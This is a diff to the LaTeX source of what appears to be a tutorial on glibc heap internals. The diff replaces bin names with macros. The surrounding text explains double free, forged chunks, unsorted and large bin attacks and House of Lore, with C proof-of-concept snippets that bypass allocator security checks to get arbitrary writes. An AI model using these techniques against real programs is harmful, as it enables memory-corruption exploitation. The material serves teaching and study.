@@ -37,6 +37,8 @@
 \newcommand*\tch{tcache}
 \newcommand*\fb{fast bins}
 \newcommand*\ub{unsorted bins}
+\newcommand*\lb{large bins}
+\newcommand*\sbs{small bins}
 
 \graphicspath{ {./images/} }
 
@@ -257,7 +259,7 @@ Whats happens when the user does not need allocated space anymore? Simply, calli
 
 \section{Bins}
 	Bin is a mechanism that the Heap manager used to manage and organize recently freed chunks, so, they can be reused during the next allocations. The simplest solution to keep track of freed space is to store them in a giant bin, although this could work It is not a good solution. Malloc is very wildly used, so, this approach leads to a performance problem.
-To improve performance, the heap manager uses different types of bins. There is 5 different type of bins: small bin, large bin, \fb{}, unsorted bin, tcache. All of the mentioned bins exist in the same area of heap manager source code. This is a list with 127 items, the index 0 is unused. 
+To improve performance, the heap manager uses different types of bins. There is 5 different type of bins: \sbs{}, \lb{}, \fb{}, \ub{}, \tch{}. All of the mentioned bins exist in the same area of heap manager source code. This is a list with 127 items, the index 0 is unused. 
 Now, We want to discuss how the heap manager recycles a chunk for a new allocation. First, let's consider a simple schema :
 \begin{enumerate}
 	\item If the M-bit in metadata is set, then this chunk is allocated off-heap, so, It should be unmmap.
@@ -267,12 +269,12 @@ Now, We want to discuss how the heap manager recycles a chunk for a new allocati
 	\item Otherwise, the freed chunk add to the corresponding bin
 \end{enumerate}
 
-\subsection{Small Bins}
-There are 62 small bins, Each of them store the same size of the chunk, as the result, each list is sorted by default, also, store and retrieve chunk from small bins is fast. In the 32-bit system, it stores chunk size below 512 bytes, In the 64-bit system, it stores chunk size below 1024 Byte. 
+\subsection{\sbs{}}
+There are 62 \sbs{}, Each of them store the same size of the chunk, as the result, each list is sorted by default, also, store and retrieve chunk from \sbs{} is fast. In the 32-bit system, it stores chunk size below 512 bytes, In the 64-bit system, it stores chunk size below 1024 Byte. 
 
-\subsection{Large Bins}
-For chunks over 512 bytes ( 1024 byte 64-bit ), the Heap manager uses another strategy call Large Bins. There are 63 Large Bins. The main difference between small and large bins is large bins use a size range instead of a fixed size for every bin. Every bin in the large bins store chunk with a unique size range instead of fixed size in small bins, in a way, they do not overlap with each other.
-The other difference is large bins need to manually sort during the insertion of a chunk. As the result large bins are slower than small bins, however, Large bins used less than small bins in a real program, so, this is not a big problem.
+\subsection{\lb{}}
+For chunks over 512 bytes ( 1024 byte 64-bit ), the Heap manager uses another strategy call \lb{}. There are 63 \lb{}. The main difference between small and \lb{} is \lb{} use a size range instead of a fixed size for every bin. Every bin in the \lb{} store chunk with a unique size range instead of fixed size in \sbs{}, in a way, they do not overlap with each other.
+The other difference is \lb{} need to manually sort during the insertion of a chunk. As the result \lb{} are slower than \sbs{}, however, \lb{} used less than \sbs{} in a real program, so, this is not a big problem.
 
 \subsection{\ub{}}
 Usually free() follow by an allocation of the same size in a real program. The heap manager introduced another optimization call \ub{}. In this optimization, the heap manager merges freed chunk with its neighbors and puts it inside a general bin call \ub{} instead of finding the corresponding bin. When a new allocation request arrives, the heap manager iterates the overall item in \ub{}, compares the request to each item, If an item is big enough for request, the heap manager returns it, otherwise move an item to the corresponding bin. consider following malloc code from \libc{} 2.23 :
@@ -283,11 +285,11 @@ for (;; ){
   }
 }
 \end{lstlisting}
-As you can see malloc iterate over all items inside \ub{}. We can conclude, when the heap manager tries to find chunks in unsorted bins, all of the unsorted bins chunks move to corresponding bins too.
+As you can see malloc iterate over all items inside \ub{}. We can conclude, when the heap manager tries to find chunks in \ub{}, all of the \ub{} chunks move to corresponding bins too.
 
 \subsection{\fb{}}
 This is the second optimizations on heap manager. These bins keep recently freed small chunks in a list. As we mention \ub{} merge chunk before adding to bins, but, chunk in \ub{} does not merge with neighbors, instead, \fb{} keeps them alive, so, If the program sends the same size request, then heap manager can use this chunks.
-The main difference between \fb{} and small bins is \fb{} do not merge chunks with neighbors. How \fb{} do that? The heap manager does not free up this chunk by do not set P-bit. Of course, this strategy has a downside too, the memory of the process becomes full or fragment after a while, to overcome this issue heap manager needs to ‘flush ‘ memory from time to time. There is not any periodic job to flushing \fb{}, instead, \libc{} uses another variant of free function call malloc\_consolidate(). 
+The main difference between \fb{} and \sbs{} is \fb{} do not merge chunks with neighbors. How \fb{} do that? The heap manager does not free up this chunk by do not set P-bit. Of course, this strategy has a downside too, the memory of the process becomes full or fragment after a while, to overcome this issue heap manager needs to ‘flush ‘ memory from time to time. There is not any periodic job to flushing \fb{}, instead, \libc{} uses another variant of free function call malloc\_consolidate(). 
 
 \subsection{\tch{} bins Bins}
 \tch{} is the last optimizations in the heap manager which added since \libc{-2.26}. Usually, a process has multiple threads, and a resource-like heap is shared between threats. A shared resource between threads can lead to a problem called ‘race condition’. As we mentioned before, a simple strategy to overcome race conditions is 'lock'. The lock gave temporary ownership of resources to one threat. When the job of the first threat finishes, then the second one can proceed. The lock has a great cost for heap managers which is frequently used by a program. As we talk before, the Heap manager overcomes this problem by using a secondary Arena for each threat until hits the threshold, moreover, it uses \tch{} per-threat to reduce the cost of the lock. \tch{} speeds up the allocation by having per-threat bins of a small chunk. When a threat sends an allocation request, the first \tch{} of that threat check for available chunk, If \tch{} have a big enough chunk, then threat use it and do not need to wait for a heap lock. In the first sample, you can see chunks added to \tch{} after call free, however, If we execute the same code on \libc{-2.23} we have a different result because it does not support \tch{}
@@ -318,7 +320,7 @@ Lets consider \libc{-2.31}, In these particular version \tch{} is the first plac
 }
 \end{lstlisting}
 
-The above code is located at libc\_malloc function, It is responsible to check and returns a chunk from tcache before lock the arena and search for a chunk. If the \tch{} fail, In the next step two situations may happen. If we have a single thread application there is no need to lock at Arena because there is no concurrency, instead, in a multi\-thread application heap manager first get the corresponding Arena then lock it at the first. The following code is responsible to check the mentioned situation :
+The above code is located at libc\_malloc function, It is responsible to check and returns a chunk from \tch{} before lock the arena and search for a chunk. If the \tch{} fail, In the next step two situations may happen. If we have a single thread application there is no need to lock at Arena because there is no concurrency, instead, in a multi\-thread application heap manager first get the corresponding Arena then lock it at the first. The following code is responsible to check the mentioned situation :
 \begin{lstlisting}[language=c,frame=tlrb]
 if (SINGLE_THREAD_P){
   victim = _int_malloc (&main_arena, bytes);
@@ -328,7 +330,7 @@ arena_get (ar_ptr, bytes);
 victim = _int_malloc (ar_ptr, bytes);
 \end{lstlisting}
 
-Now we discuss the \_int\_malloc() function . This function gets the request size and Arena then tries to allocate a chunk and return it from bins or top chunks. Let's consider \tch{} fails in the previous step. The next place to check is the fast bins. Also, As we mention, each fast bin keeps just one size of the chunk, as the result, remove and add a chunk to the fast bin is fast.
+Now we discuss the \_int\_malloc() function . This function gets the request size and Arena then tries to allocate a chunk and return it from bins or top chunks. Let's consider \tch{} fails in the previous step. The next place to check is the \fb{}. Also, As we mention, each fast bin keeps just one size of the chunk, as the result, remove and add a chunk to the fast bin is fast.
 \begin{lstlisting}[language=c,frame=tlrb]
 if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
 \end{lstlisting}
@@ -338,7 +340,7 @@ size_t tc_idx = csize2tidx (nb);
 if (tcache && tc_idx < mp_.tcache_bins)
 \end{lstlisting}
 
-In the following step, the heap manager checks the small bins If the request is in the range of small bins chunk size. Like fast bins, each small bins keep one chunk size, so, there is no search too.
+In the following step, the heap manager checks the \sbs{} If the request is in the range of \sbs{} chunk size. Like \fb{}, each \sbs{} keep one chunk size, so, there is no search too.
 \begin{lstlisting}[language=c,frame=tlrb]
 if (in_smallbin_range (nb)){
   idx = smallbin_index (nb);
@@ -346,7 +348,7 @@ if (in_smallbin_range (nb)){
   if ((victim = last (bin)) != bin)
 \end{lstlisting}
 
-Unlike fast bins, chunks in small bins use a double link list, so, when you remove one chunk you have to fix the forward and backward pointers for previous and next chunks. 
+Unlike \fb{}, chunks in \sbs{} use a double link list, so, when you remove one chunk you have to fix the forward and backward pointers for previous and next chunks. 
 
 \begin{lstlisting}[language=c,frame=tlrb]
 
@@ -357,12 +359,12 @@ bin->bk = bck;
 bck->fd = bin;
 \end{lstlisting}
 
-Small bin attacks usually abuse this part of code to write data in a location by manipulating the pointer's data. Like what happens in a fast bin, the Heap manager adds the same size chunk to tcache too. If the request was not in the range of small bins, heap manager free and merge fast bins chunk in the first place.
+\sbs{} attacks usually abuse this part of code to write data in a location by manipulating the pointer's data. Like what happens in a fast bin, the Heap manager adds the same size chunk to \tch{} too. If the request was not in the range of \sbs{}, heap manager free and merge \fb{} chunk in the first place.
 \begin{lstlisting}[language=c,frame=tlrb]
 malloc_consolidate (av);
 \end{lstlisting}
 
-Now it is time to check unsorted bins chunks. As we mention, the heap manager examines all of the unsorted bins chunks to find a suitable chunk. If the chunk is the same size then the heap manages to return it, if it is bigger than the requested size heap manager split the chunk return a chunk to the user, and put the remaining chunks to corresponding bins too, and remove them from the unsorted bin.
+Now it is time to check \ub{} chunks. As we mention, the heap manager examines all of the \ub{} chunks to find a suitable chunk. If the chunk is the same size then the heap manages to return it, if it is bigger than the requested size heap manager split the chunk return a chunk to the user, and put the remaining chunks to corresponding bins too, and remove them from the \ub{}.
 \begin{lstlisting}[language=c]
 for (;; )  
   int iters = 0;
@@ -410,7 +412,7 @@ free(b);
 calloc(1,8);
 calloc(1,8);
 \end{lstlisting}
-If take a look at the heap state after calloc, you can see heap manager create new chunks from the top chunk and tcache chunks remain.
+If take a look at the heap state after calloc, you can see heap manager create new chunks from the top chunk and \tch{} chunks remain.
 
 \section{Alignment()}
 
@@ -451,7 +453,7 @@ To find when malloc\_consolidate() calls, we invest two different versions of \l
  }
 \end{lstlisting}
 
-As we tell, small/large bins are one of the places which malloc search to find free chunk at the first phase. During this check, the heap manager performs flush to move \fb{} chunk too. If we check mentioned section in the latest \libc{} version, we see a small bin check does not contain malloc\_consolidate() anymore.
+As we tell, small/\lb{} are one of the places which malloc search to find free chunk at the first phase. During this check, the heap manager performs flush to move \fb{} chunk too. If we check mentioned section in the latest \libc{} version, we see a \sbs{} check does not contain malloc\_consolidate() anymore.
 
 \begin{lstlisting}[language=c,frame=tlrb]
  if (in_smallbin_range (nb)){
@@ -486,7 +488,7 @@ The rest of the usage located inside malloc\_trim and malloc\_opt
 As the implementation of the \libc{} has changed and improved over the years, various methods have been proposed for its exploitation. In this chapter, we discuss must famous heap exploitation techniques. how exploitation works entirely depends on the heap implementation, as the result, some techniques work on a specific version of \libc{}. we discussed each technique in one or more versions.
 
 \section{Double Free}
-This is the first attack that we want to discuss which use by other attacks too. What is happen if an allocated chunk of data frees twice? In this situation, the heap data structure is corrupted and finally lead to a memory leak that the attacker can use. As we discussed before, after the user frees an allocated space, this chunk adds to corresponding bins. In the simplest scenario in \libc{-2.23} , it adds to fast bins. Consider the following sample code :
+This is the first attack that we want to discuss which use by other attacks too. What is happen if an allocated chunk of data frees twice? In this situation, the heap data structure is corrupted and finally lead to a memory leak that the attacker can use. As we discussed before, after the user frees an allocated space, this chunk adds to corresponding bins. In the simplest scenario in \libc{-2.23} , it adds to \fb{}. Consider the following sample code :
 
 \begin{lstlisting}[language=c,frame=tlrb]
 a = malloc(10);  // 0xa04010
@@ -508,7 +510,7 @@ head -> b -> a -> tail
 head -> a -> b -> a -> tail
 \end{lstlisting}
 
-As you can see we have ‘a’ twice in the fast bins now. what is happen if the 'a' frees twice continuous? double 'a' can not free continuous instead the ‘b’ frees in the middle of them. This is one of the fast bins security checks if double ‘a’ free continuous the fast bin can detect the ‘a’ is on the top of the list right now, so, the program crashes. To bypass the fast bins security check, it is mandatory to free another chunk in the middle. 3 new chunks of data are allocated in the following. You can see the fast bin state below step-by-step during the second allocation :
+As you can see we have ‘a’ twice in the \fb{} now. what is happen if the 'a' frees twice continuous? double 'a' can not free continuous instead the ‘b’ frees in the middle of them. This is one of the \fb{} security checks if double ‘a’ free continuous the fast bin can detect the ‘a’ is on the top of the list right now, so, the program crashes. To bypass the \fb{} security check, it is mandatory to free another chunk in the middle. 3 new chunks of data are allocated in the following. You can see the fast bin state below step-by-step during the second allocation :
 
 \begin{lstlisting}[frame=tlrb]
 head -> b -> a -> tail [ 'a' is returned ]
@@ -516,8 +518,8 @@ head -> a -> tail [ 'b' is returned ]
 head -> tail [ 'a' is returned ]
 \end{lstlisting}
 
-At the end ‘d’ and ‘f’ points to the same memory location, as the result, any change in one leads to another. You should pay attention to the fact that both allocations have the same chunk size, otherwise, the heap manager creates a new chunk from the top chunk instead of return fast bins freed chunks.
-This method needs to be modified since \libc{-2.26} introduced tcache. On the new \libc{}, freed chunks add to tcache instead of fast bins, as the result, we need to do some modification to this attack. consider the following code :
+At the end ‘d’ and ‘f’ points to the same memory location, as the result, any change in one leads to another. You should pay attention to the fact that both allocations have the same chunk size, otherwise, the heap manager creates a new chunk from the top chunk instead of return \fb{} freed chunks.
+This method needs to be modified since \libc{-2.26} introduced \tch{}. On the new \libc{}, freed chunks add to \tch{} instead of \fb{}, as the result, we need to do some modification to this attack. consider the following code :
 
 \begin{lstlisting}[language=c,frame=tlrb]
 void *ptrs[8];
@@ -529,7 +531,7 @@ for (int i=0; i<7; i++) {
 }
 \end{lstlisting}
 
-Tcache can keep up to 7 chunks. A simple solution to add free chunks to fast bins instead of tcache is to fill the tcache, in the following, create new chunks from the top chunk instead of return freed tcache chunks. The above code allocated 7 chunks of 8 bytes then free all of them. In the new version of \libc{}, all of these 7 freed chunks add to tcache. From this point, if we free other chunks, they add to fastbin because tcache is full. Now we pull back to the original approach and allocate 3 new chunks. If we use malloc() to allocate new chunks, the heap manager returns chunks from tcache, so, tcache becomes free again and we can’t implement the attack. In such a situation calloc can be used. Calloc does not use tcache and Fast bins are free so calloc gets memory from the top chunk. 
+\tch{} can keep up to 7 chunks. A simple solution to add free chunks to \fb{} instead of \tch{} is to fill the \tch{}, in the following, create new chunks from the top chunk instead of return freed \tch{} chunks. The above code allocated 7 chunks of 8 bytes then free all of them. In the new version of \libc{}, all of these 7 freed chunks add to \tch{}. From this point, if we free other chunks, they add to \fb{} because \tch{} is full. Now we pull back to the original approach and allocate 3 new chunks. If we use malloc() to allocate new chunks, the heap manager returns chunks from \tch{}, so, \tch{} becomes free again and we can’t implement the attack. In such a situation calloc can be used. Calloc does not use \tch{} and \fb{} are free so calloc gets memory from the top chunk. 
 
 \begin{lstlisting}[language=c,frame=tlrb]
 	int *a = calloc(1, 8);
@@ -537,7 +539,7 @@ Tcache can keep up to 7 chunks. A simple solution to add free chunks to fast bin
 	int *c = calloc(1, 8);
 \end{lstlisting}
 
-The result of the above code is allocated 3 new chunks of memory from the top chunk while tcache is still full of freed chunks. In another word, We force the heap manager to allocate memory from the top chunk instead of use freed chunks. The above approach use by other attacks to bypass the tcache policy too. The following steps are like the original approach, but calloc :
+The result of the above code is allocated 3 new chunks of memory from the top chunk while \tch{} is still full of freed chunks. In another word, We force the heap manager to allocate memory from the top chunk instead of use freed chunks. The above approach use by other attacks to bypass the \tch{} policy too. The following steps are like the original approach, but calloc :
 
 \begin{lstlisting}[language=c,frame=tlrb]
 
@@ -560,8 +562,8 @@ In the previous example, we used small chunk allocation. What is happen if we re
 	free(p1);
 \end{lstlisting}
 
-The thirds malloc have a big memory allocation, this malloc triggers another method call malloc\_consolidate() automatically. Malloc In this situation consolidate chunks in the fast bin before continuing, then, put the resulting merged chunks on the unsorted bin.
-The result of such behavior is we have another solution to bypass the fast bin double-free security check. It is possible to use malloc with a big size instead of free another chunk in the middle of two free. The third malloc moves chunk from fast bin to unsorted, as the result, when the second free request arrives there is no chunk inside the fast bins. we can implement a double-free attack. In the final layout, we have P1 on both fast bins and unsorted bins. Move fast bins chunks to unsorted bins by a big size memory allocation is a simple approach which uses by other attack methods too.
+The thirds malloc have a big memory allocation, this malloc triggers another method call malloc\_consolidate() automatically. Malloc In this situation consolidate chunks in the fast bin before continuing, then, put the resulting merged chunks on the \ub{}.
+The result of such behavior is we have another solution to bypass the fast bin double-free security check. It is possible to use malloc with a big size instead of free another chunk in the middle of two free. The third malloc moves chunk from fast bin to unsorted, as the result, when the second free request arrives there is no chunk inside the \fb{}. we can implement a double-free attack. In the final layout, we have P1 on both \fb{} and \ub{}. Move \fb{} chunks to \ub{} by a big size memory allocation is a simple approach which uses by other attack methods too.
 
 \section{Forged Chunk}
 Freeing up a chunk does not prevent access to it because the pointer still exists in the application, so, we can implement an attack on the heap data structure by taking control of the pointer . Below code shows how we can return our forged chunk instead of a real heap chunk: 
@@ -592,8 +594,8 @@ malloc(10);     // Will return 0x219c010
 victim = malloc(10);   // Points to 0x7ffc6de966a0
 \end{lstlisting}
 
-In the first step, we allocate a memory ‘a’ with 10-Byte size, also, Create our fake chunk with size 0x20. Chunk size is important It must fall in fastbin chunks size because fastbin has a security check on chunk size while removing it from the list.
-Now by call free(a), the real chunk is put back in the fast bins. As we tell, we free up space but the pointer still points to chunk memory location. By accessing the pointer, we make the forward pointer of freed chunk ‘a’ to point to the forged chunk. The current layout of the heap is like below now : 
+In the first step, we allocate a memory ‘a’ with 10-Byte size, also, Create our fake chunk with size 0x20. Chunk size is important It must fall in \fb{} chunks size because \fb{} has a security check on chunk size while removing it from the list.
+Now by call free(a), the real chunk is put back in the \fb{}. As we tell, we free up space but the pointer still points to chunk memory location. By accessing the pointer, we make the forward pointer of freed chunk ‘a’ to point to the forged chunk. The current layout of the heap is like below now : 
 
 \begin{lstlisting}[language=c,frame=tlrb]
 head -> a -> forged chunk -> undefined (forward of the forged chunk be holding attacker's data)
@@ -606,7 +608,7 @@ head -> forged chunk -> undefined
 head -> undefined [ forged chunk is returned to the victim ]
 \end{lstlisting}
 
-Take into consideration, another allocation on fastbin could raise Segmentation faults.
+Take into consideration, another allocation on \fb{} could raise Segmentation faults.
 Now let’s use double-free vulnerabilities in \libc{-2.23}, The below code is just an extended version of the Double Free attack which we examined. The extended version tricks malloc() to return a controller memory location on the stack instead of a real chunk of the heap. 
 
 \begin{lstlisting}[language=c,frame=tlrb]
@@ -625,18 +627,18 @@ malloc(8)
 malloc(8)
 \end{lstlisting}
 
-As you can see in the first part we allocate 3 chunks and free one of them twice to bypass the fastbin security check as we mentioned before, as the result, we have twice ‘a’ in the fastbin list and attack by modifying data at ‘a’. On the following we have two mallocs, the first one keep access to ‘a’ inside ‘d’ pointer, the second one simply remove the ‘b’ from top of the fast bins, now we have one pointer to ‘a’ inside the program as ‘d’ , also, another ‘a’ at top of the heap, remember any change on ‘a’ inside the program could affect on ‘a’ at top of fastbin too.
+As you can see in the first part we allocate 3 chunks and free one of them twice to bypass the \fb{} security check as we mentioned before, as the result, we have twice ‘a’ in the \fb{} list and attack by modifying data at ‘a’. On the following we have two mallocs, the first one keep access to ‘a’ inside ‘d’ pointer, the second one simply remove the ‘b’ from top of the \fb{}, now we have one pointer to ‘a’ inside the program as ‘d’ , also, another ‘a’ at top of the heap, remember any change on ‘a’ inside the program could affect on ‘a’ at top of \fb{} too.
 
 \begin{lstlisting}[language=c,frame=tlrb]
 head -> a 
 \end{lstlisting}
 
-The final step is to write 0x20 on the stack and overwrite the first 8 bytes of data at ‘a’ (any change on ‘d’ affect ‘a’ at top of the fast bins) in away point to write before 0x20 on the stack. In this way, we trick the heap in a way that thinks there is an available free chunk.
- Now, all we have to do is remove ‘a’ from the top of the fast bins with a call to malloc(), then, final malloc returns a controller address on memory to the program, in this case, stack.
+The final step is to write 0x20 on the stack and overwrite the first 8 bytes of data at ‘a’ (any change on ‘d’ affect ‘a’ at top of the \fb{}) in away point to write before 0x20 on the stack. In this way, we trick the heap in a way that thinks there is an available free chunk.
+ Now, all we have to do is remove ‘a’ from the top of the \fb{} with a call to malloc(), then, final malloc returns a controller address on memory to the program, in this case, stack.
 
-\section{Unsorted Bin Attack}
+\section{\ub{} Attack}
 
-In previous sections we see how to implement an attack on fast bins, now, we want to demonstrate an attack on the unsorted bin. As the name suggests this attack abuse unsorted bins to conduct an attack. The mechanism of this attack is to take control of backward pointer chunks in the unsorted bin. The goal of this attack is to modify a value, as the result, this attack can be used to implement other attacks too.
+In previous sections we see how to implement an attack on \fb{}, now, we want to demonstrate an attack on the \ub{}. As the name suggests this attack abuse \ub{} to conduct an attack. The mechanism of this attack is to take control of backward pointer chunks in the \ub{}. The goal of this attack is to modify a value, as the result, this attack can be used to implement other attacks too.
 
 Let’s start with a sample and consider the following code. This code tries to write a big value in the stack:
 \begin{lstlisting}[language=c,frame=tlrb]
@@ -649,20 +651,20 @@ p[1]=(unsigned long)(&stack_var-2);
 //------------------------------------
 malloc(400);
 \end{lstlisting}
- At the first line, we define our target ‘stack\_var’ where we want to write the big value. On the second and third lines, we allocate two memory chunks from the heap. The second allocation needs to keep a distance from the top of the heap, otherwise, when we free ‘p’ the heap manager merges it with the top of the heap automatically. At least, we have to write our target address in the backward pointer of ‘p’. Now, the heap manager does the rest. As we mentioned before Unsorted Bin uses a double linked list, so, when the heap manager tries to remove a chunk from this double-link list, the backward pointer must be rewritten to remove a chunk from the list, In malloc, we have such a code : 
+ At the first line, we define our target ‘stack\_var’ where we want to write the big value. On the second and third lines, we allocate two memory chunks from the heap. The second allocation needs to keep a distance from the top of the heap, otherwise, when we free ‘p’ the heap manager merges it with the top of the heap automatically. At least, we have to write our target address in the backward pointer of ‘p’. Now, the heap manager does the rest. As we mentioned before \ub{} uses a double linked list, so, when the heap manager tries to remove a chunk from this double-link list, the backward pointer must be rewritten to remove a chunk from the list, In malloc, we have such a code : 
  
 \begin{lstlisting}[language=c,frame=tlrb]
 unsorted_chunks (av)->bk = bck;
 bck->fd = unsorted_chunks (av);
 \end{lstlisting}
 
-The last malloc tries to allocate 400-Byte of memory, so the heap manager checks the unsorted bin to find a suitable chunk of memory. Also, move the unsorted bin’s chunk to corresponding bins. If you check the malloc source code you can see malloc check every item to achieve this goal. At first, we have such a code :
+The last malloc tries to allocate 400-Byte of memory, so the heap manager checks the \ub{} to find a suitable chunk of memory. Also, move the \ub{} chunk to corresponding bins. If you check the malloc source code you can see malloc check every item to achieve this goal. At first, we have such a code :
 \begin{lstlisting}[language=c,frame=tlrb]
 
 while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)){
 bck = victim->bk;
 \end{lstlisting}
-‘Av’ is Arena and unsorted\_chunks (av) is the head of the Unsorted bin and Victim is our current item. You can see, malloc checks items from the head of the Unsorted bin and removes them one by one. Put it all to gather :
+‘Av’ is Arena and unsorted\_chunks (av) is the head of the \ub{} and Victim is our current item. You can see, malloc checks items from the head of the \ub{} and removes them one by one. Put it all to gather :
 
 \begin{lstlisting}[language=c,frame=tlrb]
 victim = unsorted_chunks (av) -> bk = p
@@ -678,9 +680,9 @@ if (\_\_glibc_unlikely (bck->fd != victim))
 	malloc\_printerr ('malloc(): corrupted unsorted chunks 3');
 \end{lstlisting}
 
-\section{Large bin Attack}
+\section{\lb{} Attack}
 
-As the name suggests, this attack is about the Large bins. The goal is to force a large bin to write data in a controlled location.
+As the name suggests, this attack is about the \lb{}. The goal is to force a \lb{} to write data in a controlled location.
 
 \begin{lstlisting}[language=c,frame=tlrb]
 size_t target = 0;
@@ -690,20 +692,20 @@ size_t *p2 = malloc(0x418);
 size_t *g2 = malloc(0x18);
 \end{lstlisting}
 
-The first step is to define the target, also, we need to define two chunks in the range size of large bins, moreover, we need to define two chunks between them to prevent them from merging or the top chunk. 
+The first step is to define the target, also, we need to define two chunks in the range size of \lb{}, moreover, we need to define two chunks between them to prevent them from merging or the top chunk. 
 
 \begin{lstlisting}[language=c,frame=tlrb]
 free(p1);
 size_t *g3 = malloc(0x438);
 \end{lstlisting}
 
-In the second step, we free the biggest chunk, however, the freed chunk is not in the large bin yet. As we discussed, the freed chunk was added to unsorted bins at first, so, The best way to move it into the large bin is to allocate a new bigger chunk. In this way, the heap manager checks the chunk inside the unsorted bin, then adds them into the corresponding bins (Like other attacks).
+In the second step, we free the biggest chunk, however, the freed chunk is not in the \lb{} yet. As we discussed, the freed chunk was added to \ub{} at first, so, The best way to move it into the \lb{} is to allocate a new bigger chunk. In this way, the heap manager checks the chunk inside the \ub{}, then adds them into the corresponding bins (Like other attacks).
 
 \begin{lstlisting}[language=c,frame=tlrb]
 free(p2);
 \end{lstlisting}
 
-In the third step, we freed the smaller chunk. Now we have one chunk inside the large bin and one chunk in the unsorted bin.
+In the third step, we freed the smaller chunk. Now we have one chunk inside the \lb{} and one chunk in the \ub{}.
 
 \begin{lstlisting}[frame=tlrb]
 
@@ -715,7 +717,7 @@ Chunk(addr=0x5555555592a0, size=0x430, flags=PREV_INUSE)
 
  \end{lstlisting}
  
-The next step is to put the target address - 0x20 in the p1->bk\_nextsize . As we mentioned before, Just large bins chunk chunks use this pointer, they point to the next biggest chunk in the link list.
+The next step is to put the target address - 0x20 in the p1->bk\_nextsize . As we mentioned before, Just \lb{} chunk chunks use this pointer, they point to the next biggest chunk in the link list.
 
 \begin{lstlisting}[language=c,frame=tlrb]
 p1[3] = (size_t)((&target)-4);
@@ -752,7 +754,7 @@ Chunk(addr=0x555555559210, size=0x80, flags=)
  [0x0000555555559210  33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 3333333333333333]
  \end{lstlisting}
 
-Now lets free() the second chunk, As we discuss, This chunk add to the unsorted bin at first, then, It can be used for future allocation :
+Now lets free() the second chunk, As we discuss, This chunk add to the \ub{} at first, then, It can be used for future allocation :
 
 \begin{lstlisting}[language=c,frame=tlrb]
 free(p2).
@@ -793,7 +795,7 @@ unsorted_bins[0]: fw=0x555555559100, bk=0x555555559100
  Chunk(addr=0x555555559110, size=0x180, flags=PREV_INUSE)
  \end{lstlisting}
  
-As you remember, currently, p2 located at the unsorted bin, also, we change the size of p2, so, the heap manager return p2 when receives an allocation request, as the result, p2 has overlap with previous chunks :
+As you remember, currently, p2 located at the \ub{}, also, we change the size of p2, so, the heap manager return p2 when receives an allocation request, as the result, p2 has overlap with previous chunks :
 
 \begin{lstlisting}[language=c,frame=tlrb]
 p4 = malloc(evil_region_size);
@@ -893,7 +895,7 @@ When a non\_main arena heap creates, the first thing that goes into this heap is
 This attack works by manipulating the heap in a way a fake ar\_ptr supply to \_init\_free(), as the result, an arbitrary overwrite be happen. The Attacker has to allocate enough memory until reaches non\_main\_arena where he has control over arena data. Max heap size is 1024*1024 plus 512kb of padding, so, max allocation never is more than 1MB.
 We saw It possible to hijack the heap\_info and supply an arbitrary ar\_ptr value, so, what value should we use for ar\_ptr? We have two option on that :
 \subsection{Large area of memory}
-Use a large area of memory then unsorted bin link code overwrite the target for us. There is some condition and security check, if we can bypass them all the following code of unsorted bin do the real job:
+Use a large area of memory then \ub{} link code overwrite the target for us. There is some condition and security check, if we can bypass them all the following code of \ub{} do the real job:
 \begin{lstlisting}[language=c,frame=tlrb]
   bck = unsorted_chunks(av);
    fwd = bck->fd;
@@ -905,7 +907,7 @@ Use a large area of memory then unsorted bin link code overwrite the target for 
 In the above code ‘p’ stands for the address of the attacker overflowed chunk, unsorted\_chunks(av)returns av->bin[0] which is controlled by the attacker, as the result, bk->fd overwrite ‘p’.
 
 \subsection{Fast bin}
-Consider following code of fast bins
+Consider following code of \fb{}
 \begin{lstlisting}[language=c,frame=tlrb]
 
   if ((unsigned long)(size) <= (unsigned long)(av->max_fast))
@@ -958,12 +960,12 @@ The next step as we told, The location of fake arena is located at an offset of 
 		user_mem = malloc(MAX_SIZE);
 	}
 \end{lstlisting}
-As we told, this approach use the fast bins approach , so, we need a chunk in range of the fast bins chunk , also, a pointer to chunk : 
+As we told, this approach use the \fb{} approach , so, we need a chunk in range of the \fb{} chunk , also, a pointer to chunk : 
 \begin{lstlisting}[language=c,frame=tlrb]
 	uint64_t* fastbin_chunk = malloc(0x50)
 	uint64_t* chunk_ptr = fastbin_chunk - 2
 \end{lstlisting}
-This file work on \libc{-2.31} which support tcache as the first mechanism, so, like fastbin\_dup all we need is to fill up the tcache to force the heap manager role back to the fast bins
+This file work on \libc{-2.31} which support \tch{} as the first mechanism, so, like fastbin\_dup all we need is to fill up the \tch{} to force the heap manager role back to the \fb{}
 \begin{lstlisting}[language=c,frame=tlrb]
 
 	uint64_t* tcache_chunks[7];
@@ -1060,7 +1062,7 @@ Unfortunate this attack does not work on current \libc{} version because of belo
 \end{lstlisting}
 \subsection{The House of Lore}
 
-This attack abuses the vulnerability inside small bins to modify memory in any location. If you check the malloc source code, you can see there is a check for small chunk request, so , if the requested chunk fits inside the small bins range, the heap manager use it 
+This attack abuses the vulnerability inside \sbs{} to modify memory in any location. If you check the malloc source code, you can see there is a check for small chunk request, so , if the requested chunk fits inside the \sbs{} range, the heap manager use it 
 \begin{lstlisting}[language=c,frame=tlrb]
 if (in_smallbin_range (nb))
 \end{lstlisting}
@@ -1090,14 +1092,14 @@ At first, we allocate a small chunk, then calculate the real address of the chun
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
  \end{lstlisting}
- Now we forge a fake chunk, point the bck pointer of buffer\_1 to the victim, the fwd pointer of buffer\_1 to buffer\_2, also, the bck pointer of buffer\_2 to buffer\_1. In this way, we can bypass the small bin security check. 
+ Now we forge a fake chunk, point the bck pointer of buffer\_1 to the victim, the fwd pointer of buffer\_1 to buffer\_2, also, the bck pointer of buffer\_2 to buffer\_1. In this way, we can bypass the \sbs{} security check. 
  \begin{lstlisting}[language=c,frame=tlrb]
  void *p5 = malloc(1000);
 free((void*)victim);
  void *p2 = malloc(1200);
  \end{lstlisting}
  
-To prevent merging the top chunk with a small one during free() we allocate a big chunk on top of the heap. After that by freeing the victim, it moves to the unsorted bin. In the following step, we allocate another chunk big enough, so, heap manager can't use the chunk inside an unsorted bin or small bin.
+To prevent merging the top chunk with a small one during free() we allocate a big chunk on top of the heap. After that by freeing the victim, it moves to the \ub{}. In the following step, we allocate another chunk big enough, so, heap manager can't use the chunk inside an \ub{} or \sbs{}.
  \begin{lstlisting}[language=c,frame=tlrb]
